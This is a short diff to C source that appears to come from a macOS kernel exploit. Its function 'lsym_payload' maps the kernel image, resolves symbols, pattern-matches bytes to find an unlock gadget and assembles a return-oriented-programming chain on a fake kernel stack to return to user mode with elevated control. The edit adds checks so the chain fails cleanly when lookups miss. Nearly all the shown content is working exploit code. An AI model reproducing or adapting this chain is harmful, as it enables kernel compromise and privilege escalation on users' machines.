@@ -20,7 +20,6 @@ char lsym_payload(uint64_t *reg1, uint64_t *reg2, uint16_t regs, void* payload) 
             mapping_kernel = lsym_map_file("/System/Library/Kernels/kernel");
         }
 
-        
         uint64_t* scratch = alloc((void*)0x3133700000, 0x10000);
         kernel_fake_stack_t* stack = alloc((void*)0x3134000000, sizeof(kernel_fake_stack_t));
         uint64_t* rax = (uint64_t*)reg1;
@@ -113,11 +112,13 @@ char lsym_payload(uint64_t *reg1, uint64_t *reg2, uint16_t regs, void* payload) 
         
         // locks are unlocked in this function
         uint64_t iokit_nf = lsym_find_symbol(mapping_kernel, "_iokit_notify");
+	if(!iokit_nf) return 0;
         iokit_nf -= lsym_kernel_base(mapping_kernel);
         
         // we need to find the movl r12d, eax stuff until retq. the call and the lea can change on each kernel version. this should stay the same for a long time.
         // we know that the lea happens 0xc bytes before anyway (thank you otool -tv!)
         uint64_t unlock = (uint64_t)memmem(mapping_kernel->map + iokit_nf, 0x100 /* should be enough */, (char*)((uint8_t[]){0x44, 0x89, 0xE0, 0x48, 0x83, 0xC4, 0x18, 0x5B, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0x5D, 0xC3}), 0x12);
+	if(!unlock) return 0;
         
         unlock -= 0xc;
         unlock -= (uint64_t) mapping_kernel->map;
@@ -136,7 +137,7 @@ char lsym_payload(uint64_t *reg1, uint64_t *reg2, uint16_t regs, void* payload) 
         PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, "_thread_exception_return"); // retq - back to usermode
         PUSH_GADGET(stack) = ROP_ARG1(stack, mapping_kernel, (uint64_t) "pwn: thread_exception_return returned."); // won't be called, ever.
         PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, "_panic");
-
+	return 1;
     }
     return 0;
 }
